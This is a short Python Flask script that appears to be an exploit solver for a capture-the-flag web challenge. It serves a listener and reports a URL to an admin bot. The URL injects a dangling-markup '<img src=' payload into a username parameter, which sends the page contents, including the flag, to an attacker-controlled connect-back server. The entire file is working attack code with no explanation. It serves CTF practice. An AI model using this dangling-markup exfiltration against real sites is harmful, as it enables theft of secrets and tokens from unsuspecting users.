from flask import Flask, request
import os
import requests
import threading
import time
from urllib.parse import quote_plus
import re

app = Flask(__name__)


@app.route("/")
def index():
    dangling = request.args.get("dangling", "")
    flag = re.findall(r"Alpaca{\w+}", dangling)
    if len(flag) > 0:
        print(f"flag received: {flag[0]}")
        os._exit(0)
    return ""


def report_url():
    time.sleep(1)  # wait for flask to start

    BOT_BASE_URL = os.getenv("BOT_BASE_URL", "http://localhost:1337")
    CONNECTBACK_URL = os.getenv("CONNECTBACK_URL", "")

    url = "http://web:3000/?username=" + quote_plus(f'<img src="{CONNECTBACK_URL}/?dangling=')
    print(f"Reporting URL: {url}")

    res = requests.post(
        f"{BOT_BASE_URL}/api/report",
        json={"url": url},
        headers={"Content-Type": "application/json"},
    )

    print(f"Reported URL: {url}, Response: {res.text}")


if __name__ == "__main__":
    threading.Thread(target=report_url).start()
    app.run(host="0.0.0.0", port=9999)
